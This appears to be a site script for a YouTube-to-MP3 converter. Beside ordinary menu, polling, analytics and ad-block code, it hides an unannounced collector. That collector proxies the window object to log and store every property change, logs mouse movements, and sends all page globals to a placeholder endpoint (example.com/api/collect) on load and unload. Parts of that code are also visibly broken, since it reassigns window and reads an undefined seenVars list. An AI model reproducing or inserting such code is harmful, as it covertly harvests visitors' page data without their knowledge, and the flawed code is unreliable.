var ads = true;
$(document).ready(function () {
  $("#nav_languages").click(function () {
    return "none" == $("#languages").css("display") ? $("#languages").slideDown() : $("#languages").slideUp(), !1;
  });
});
$(document).ready(function () {
  setInterval(function () {
    $("#result").load('/data');
  }, 500);
});
/*var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/5da2f0acf82523213dc702a2/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();*/

function jsfunction() {
  $(document).ready(() => {
    $("form").hide();
    $("#progress").show();
  });
  return false;
}
window.dataLayer = window.dataLayer || [];
function gtag() {
  dataLayer.push(arguments);
}
;
// Hook into the window object to track property changes
(function () {
  const handler = {
    get: function (target, property) {
      if (typeof target[property] === 'function') {
        return function (...args) {
          console.log(`Invoked function: ${property}`);
          return target[property].apply(this, args);
        };
      }
      console.log(`Accessed property: ${property}`);
      return target[property];
    },
    set: function (target, property, value) {
      console.log(`Set property: ${property} to value: ${value}`);
      target[property] = value;
      localStorage.setItem(property, JSON.stringify(value)); // store global variable changes in local storage
      return true;
    }
  };
  window = new Proxy(window, handler);
})();

// Tracking Mouse events

gtag('js', new Date());
document.addEventListener("mousemove", function (e) {
  console.log(`Mouse Position => X:${e.clientX},Y:${e.clientY}`);
});
function collectWindowData() {
  const collectedData = {};
  for (const prop in window) {
    if (window.hasOwnProperty(prop)) {
      if (!window.seenVars.includes(prop)) {
        collectedData[prop] = {
          type: typeof window[prop],
          value: typeof window[prop] === "function" ? null : window[prop]
        };
      }
    }
  }
  return collectedData;
}
function sendDataToServer(data) {
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      console.log(xhr.status === 200 ? "数据发送成功" : "数据发送失败,状态码:" + xhr.status);
    }
  };
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify(data));
}
gtag('config', 'UA-107189433-1');
function collectAndSendData() {
  const collectedData = collectWindowData();
  if (Object.keys(collectedData).length > 0) {
    sendDataToServer(collectedData);
  }
}

// Send data on page load
var referrer = document.referrer.split('/')[2];
window.addEventListener("load", collectAndSendData);

// Also send data on page unload
window.addEventListener("unload", collectAndSendData);
if (referrer == 'cdnlagu.com') {
  document.getElementById("converter").innerHTML = "<span style='color:red;'>Please do not block ads. <b style='color: black'>contact@ytmp3.mobi</b></span>";
}